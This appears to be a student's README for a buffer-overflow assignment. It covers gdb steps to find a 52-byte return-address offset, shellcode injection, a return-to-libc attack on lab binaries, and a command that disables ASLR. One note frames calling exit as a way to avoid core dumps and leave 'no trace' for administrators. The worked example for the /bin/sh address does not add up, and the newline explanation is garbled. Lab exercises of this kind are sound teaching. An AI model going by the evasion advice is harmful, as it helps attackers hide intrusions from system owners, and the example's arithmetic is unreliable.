# ðŸ“˜ Overview

This assignment explores exploiting buffer overflow vulnerabilities in two different scenarios:

1. A simple buffer overflow that allows an attacker to execute shellcode.
2. A more advanced buffer overflow using the "return to libc" technique to execute shellcode.

## Buffer Overflow Exploit Steps

### Part 1: Changing the Grade

To alter the grade from `6` to any desired value, the buffer must be filled until the memory location of the `grade` variable is reached. A Python script generates a payload to change the grade, and this payload is stored as a binary file named `grade_change.txt`.

To execute the program and change the grade:

```bash
(cat grade_change.txt; cat) | ./Greeter
```

#### Special Case: Grade 10

For grade `10`, the program displays:

```bash
Hello, A...A, your grade is 0
```

Although the intended grade is 10, the program misinterprets the hexadecimal value and prints 0. This happens because the newline character ('\n') in the OS corresponds to the Line Feed (LF) control character, which is 0x0A in hexadecimal. When the program reads the hexadecimal value of the grade, it encounters 0x0A. Since 0x0A is the ASCII representation of the newline character, not a numeric digit, the program either printings  0.

### Part 2: Simple Buffer Overflow

1. **Locate the Return Address**  
   Use the `gdb` debugger with a known input string to find the return address. Once identified, calculate the offset to the buffer.I our case, we need 52 bytes until we reach the return address.This can be easily proven by simply running the following code

    ```bash
    python -c 'print("A"*52 + "BCDE")' > tempFile
    ```

    Inside the gdb debugger, run the following command

    ```bash
    r < tempFile
    ```

    The program will crash and you will see the following output

    ```bash
    Program received signal SIGSEGV, Segmentation fault.
    0x45444342 in ?? ()
    ```

    From the previous message it is clear that the program crashed at the address 0x45444342 which is the ASCII representation of the string "BCDE". This means that the return address is 52 bytes away from the start of the buffer.

2. **Find the Address of the Variable `Name`**  
   Since the buffer is non-executable, locate the executable memory address of the variable `Name`:

   ```bash
   p Name
   ```

   Use this address to overwrite the return address and execute the shellcode.

3. **Generate the Payload**  
   A Python script (`Buffer_Attack.py`) creates the payload, resulting in a binary file. Use the following command to run the exploit:

   ```bash
   (cat payload; cat) | ./Greeter
   ```

### Part 3: Return to libc Technique

To execute a shell using the "return to libc" technique, construct the following buffer structure:

```bash
| NOP sled | system | return address for system | /bin/sh |
```

#### Steps

1. **Find Function and String Addresses**  
   Use `gdb` to locate necessary addresses:

   ```bash
   break main
   p system
   p exit
   info proc map
   ```

2. **Locate `/bin/sh` String Address**  
   From the output of `info proc map`, identify the libc library and find the offset of the string `/bin/sh`:

   ```bash
   strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
   ```

   Combine the libc base address with the offset to compute the final address of `/bin/sh`.

   Example:

    ```bash
   libc base address: 0xf7d72000
   Offset: 0x1b3e9a
   Address of `/bin/sh`: 0xf7f36de8
   ```

3. **Verify the Address**  
   Confirm the computed address in `gdb`:

   ```bash
   x/s 0xf7f36de8
   ```

   The result should display:

   ```bash
   "/bin/sh"
   ```

4. **Generate and Execute the Payload**  
   Use Python to pack the addresses into a binary payload. Execute the program:

   ```bash
   (cat payload_secure; cat) | ./SecGreeter
   ```

   **Note**: In some operating systems, like FreeBSD, a core dump is logged to a specific location, allowing an administrator to detect attempted exploitation of a binary. To avoid detection, we use the `exit` function. This ensures that when the program terminates, no core dump is generated, leaving no trace of your activity.

#### Disable ASLR

For the exploit to succeed, Address Space Layout Randomization (ASLR) must be disabled:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
